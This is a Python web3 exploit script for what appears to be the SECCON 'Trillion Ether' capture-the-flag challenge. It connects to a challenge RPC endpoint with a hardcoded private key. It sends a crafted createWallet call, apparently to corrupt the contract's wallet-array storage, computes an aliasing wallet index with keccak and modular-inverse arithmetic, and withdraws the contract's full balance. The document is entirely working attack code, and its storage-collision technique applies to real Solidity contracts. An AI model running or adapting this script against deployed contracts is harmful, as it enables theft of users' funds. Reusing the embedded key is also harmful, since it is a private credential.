from web3 import Web3
import sys

# Update with your connection details
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/ffcfceae-5b6c-4062-a0d7-b1623b0f2f1e'
private_key = 'a2a2eeb0a895a45ea6814efe279b49023f5b0419721d92d5e565a93cae8e9c9b'
challenge_contract_address = '0x0c690Ec281446a76494e8eF684ADDb8f357447d9'

# Contract ABI
abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                    "name": "walletId",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "wallets",
            "outputs": [
                {
                    "components": [
                        {
                            "internalType": "bytes32",
                            "name": "name",
                            "type": "bytes32"
                        },
                        {
                            "internalType": "uint256",
                            "name": "balance",
                            "type": "uint256"
                        },
                        {
                            "internalType": "address",
                            "name": "owner",
                            "type": "address"
                        }
                    ],
                    "internalType": "struct TrillionEther.Wallet[]",
                    "name": "",
                    "type": "tuple[]"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ]

# Initialize Web3
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
account = w3.eth.account.from_key(private_key)

contract = w3.eth.contract(address=challenge_contract_address, abi=abi)

def exploit():
    # Step 1: Overwrite wallets array length and storage slots
    large_number = 2 ** 256 - 1  # Overwrite storage slot 0
    tx = contract.functions.createWallet(large_number.to_bytes(32, 'big')).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 100000,
        'gasPrice': w3.to_wei('1', 'gwei'),
        'value': 0
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 1: Overwrote wallets array length.")

    # Step 2: Calculate wallet_id
    K = int.from_bytes(w3.keccak(b'\x00'), 'big')
    inv_3 = pow(3, -1, 2 ** 256)
    wallet_id = (-K * inv_3) % (2 ** 256)
    print(f"Calculated wallet_id: {wallet_id}")

    # Step 3: Get contract balance
    contract_balance = w3.eth.get_balance(challenge_contract_address)
    print(f"Contract balance: {contract_balance}")

    # Step 4: Withdraw contract balance
    tx = contract.functions.withdraw(wallet_id, contract_balance).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 200000,
        'gasPrice': w3.to_wei('1', 'gwei'),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 4: Withdrew contract balance.")

    # Step 5: Check isSolved()
    solved = contract.functions.isSolved().call()
    print(f"Step 5: isSolved() = {solved}")

if __name__ == '__main__':
    exploit()

